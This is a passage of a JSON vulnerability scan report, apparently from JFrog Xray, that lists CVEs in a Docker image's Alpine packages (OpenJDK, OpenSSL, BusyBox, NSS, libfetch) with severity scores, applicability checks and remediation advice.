                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21541",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
                        }
                    ],
                    "created": "2022-07-20T00:00:00.713Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21541",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-670233",
                    "summary": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "description": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-12797"
                        }
                    ],
                    "created": "2025-02-11T00:00:00.953Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in OpenSSL may allow network attackers to perform man-in-the-middle attacks when raw public keys are used.",
                        "full_description": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn OpenSSL, the `SSL_VERIFY_PEER` verification mode is used to enforce the verification of the remote server's SSL/TLS certificate during the handshake process of a secure connection. When this mode is set, the client (or server, depending on the context) will check the validity of the presented certificate against a criteria set.\n\nRaw public keys (RPK) are a cryptographic method in public key infrastructure (PKI) that represent a public key without a digital certificate. Unlike certificates, which include extra details like identity and expiration, raw public keys are simpler and more efficient, making them ideal for resource-limited environments.\n\nIn OpenSSL, connections made using TLS and DTLS with RPKs may allow attackers to man-in-the-middle if clients fail to recognize a failure in server authentication. The problem only emerges when TLS clients deliberately activate RPK usage for the server, which in turn chooses to transmit an RPK instead of an X.509 certificate chain. The clients that are impacted are those that expect the handshake to fail if the server’s RPK does not align with one of the anticipated public keys, as determined by setting the verification mode to `SSL_VERIFY_PEER`.\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nNote: By default, RPKs are turned off in both TLS clients and servers.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Data leakage.",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "Raw Public Keys are disabled by default in both TLS clients and TLS servers, which is mandatory to exploit this CVE.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "description": "The attacker must be able to intercept the communication between the client and the server using a man-in-the-middle attack.",
                                "is_positive": false
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nexample:\n```\n int verify_result = SSL_get_verify_result(ssl);\n    if (verify_result == X509_V_OK) {\n        /* The server's raw public key matched the TLSA record */\n    } else if (verify_result == X509_V_ERR_DANE_NO_MATCH) {\n       /*\n     * The server's raw public key, or public key in certificate, did not\n     * match the TLSA record\n     */\n    } else if (verify_result == X509_V_ERR_RPK_UNTRUSTED) {\n        /*\n        * No TLSA records of the correct type are available to verify the\n        * server's raw public key. This would not happen in this example,\n        * as a TLSA record is configured.\n        }*/\n    else {\n        /* Some other verify error */\n    }\n```"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-12797",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks any of the following:<br />\n1. Whether the vulnerable functions <code>SSL_add_expected_rpk()</code> or <code>SSL_dane_tlsa_add()</code> are called.<br />\n2. Whether the OpenSSL server is configured with RPK server enabled, using the vulnerable <code>-enable_rpk_server</code> option.<br />\n3. Whether the vulnerable function <code>SSL_set1_server_cert_type()</code> is called.</p>",
                            "evidence": null,
                            "info": "OpenSSL is not configured with RPK enabled or the vulnerable OpenSSL functions `SSL_set1_server_cert_type`, `SSL_add_expected_rpk`, `SSL_dane_tlsa_add` aren't called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-12797",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks any of the following:<br />\n1. Whether the vulnerable functions <code>SSL_add_expected_rpk()</code> or <code>SSL_dane_tlsa_add()</code> are called.<br />\n2. Whether the OpenSSL server is configured with RPK server enabled, using the vulnerable <code>-enable_rpk_server</code> option.<br />\n3. Whether the vulnerable function <code>SSL_set1_server_cert_type()</code> is called.</p>",
                            "evidence": null,
                            "info": "OpenSSL is not configured with RPK enabled or the vulnerable OpenSSL functions `SSL_set1_server_cert_type`, `SSL_add_expected_rpk`, `SSL_dane_tlsa_add` aren't called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-12797",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-12797",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190227",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42383",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.501Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42383",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42383",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42383",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42383",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190231",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42379",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.381Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `next_input_file` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42379",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42379",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42379",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42379",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-540571",
                    "summary": "The NSS code used for checking PKCS#1 v1.5 was leaking information useful in mounting Bleichenbacher-like attacks. Both the overall correctness of the padding as well as the length of the encrypted message was leaking through timing side-channel. By sending large number of attacker-selected ciphertexts, the attacker would be able to decrypt a previously intercepted PKCS#1 v1.5 ciphertext (for example, to decrypt a TLS session that used RSA key exchange), or forge a signature using the victim's key. The issue was fixed by implementing the implicit rejection algorithm, in which the NSS returns a deterministic random message in case invalid padding is detected, as proposed in the Marvin Attack paper. This vulnerability affects NSS < 3.61.",
                    "description": "The NSS code used for checking PKCS#1 v1.5 was leaking information useful in mounting Bleichenbacher-like attacks. Both the overall correctness of the padding as well as the length of the encrypted message was leaking through timing side-channel. By sending large number of attacker-selected ciphertexts, the attacker would be able to decrypt a previously intercepted PKCS#1 v1.5 ciphertext (for example, to decrypt a TLS session that used RSA key exchange), or forge a signature using the victim's key. The issue was fixed by implementing the implicit rejection algorithm, in which the NSS returns a deterministic random message in case invalid padding is detected, as proposed in the Marvin Attack paper. This vulnerability affects NSS < 3.61.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-4421"
                        }
                    ],
                    "created": "2023-12-13T00:00:00.786Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-4421",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100498",
                    "summary": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. Stack Exhaustion occurs in the C++ demangling functions provided by libiberty, and there is a stack consumption problem caused by recursive stack frames: cplus_demangle_type, d_bare_function_type, d_function_type.",
                    "description": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. Stack Exhaustion occurs in the C++ demangling functions provided by libiberty, and there is a stack consumption problem caused by recursive stack frames: cplus_demangle_type, d_bare_function_type, d_function_type.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-18484",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-12T00:00:00.626Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-18484",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-103667",
                    "summary": "After a HelloRetryRequest has been sent, the client may negotiate a lower protocol that TLS 1.3, resulting in an invalid state transition in the TLS State Machine. If the client gets into this state, incoming Application Data records will be ignored. This vulnerability affects Firefox < 72.",
                    "description": "After a HelloRetryRequest has been sent, the client may negotiate a lower protocol that TLS 1.3, resulting in an invalid state transition in the TLS State Machine. If the client gets into this state, incoming Application Data records will be ignored. This vulnerability affects Firefox < 72.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-17023",
                            "cwe": [
                                "CWE-287"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
                        }
                    ],
                    "created": "2020-06-29T00:00:00.105Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2019-17023",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-127592",
                    "summary": "When performing EC scalar point multiplication, the wNAF point multiplication algorithm was used; which leaked partial information about the nonce used during signature generation. Given an electro-magnetic trace of a few signature generations, the private key could have been computed. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "description": "When performing EC scalar point multiplication, the wNAF point multiplication algorithm was used; which leaked partial information about the nonce used during signature generation. Given an electro-magnetic trace of a few signature generations, the private key could have been computed. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-6829",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2020-10-29T00:00:00.570Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-6829",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180796",
                    "summary": "libfetch before 2021-07-26, as used in apk-tools, xbps, and other products, mishandles numeric strings for the FTP and HTTP protocols. The FTP passive mode implementation allows an out-of-bounds read because strtol is used to parse the relevant numbers into address bytes. It does not check if the line ends prematurely. If it does, the for-loop condition checks for the '\\0' terminator one byte too late.",
                    "description": "libfetch before 2021-07-26, as used in apk-tools, xbps, and other products, mishandles numeric strings for the FTP and HTTP protocols. The FTP passive mode implementation allows an out-of-bounds read because strtol is used to parse the relevant numbers into address bytes. It does not check if the line ends prematurely. If it does, the for-loop condition checks for the '\\0' terminator one byte too late.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-36159",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v2": "6.4/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:P",
                            "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2021-08-04T00:00:00.854Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:apk-tools:2.10.6-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-36159",
                            "result": "not_covered"
                        }
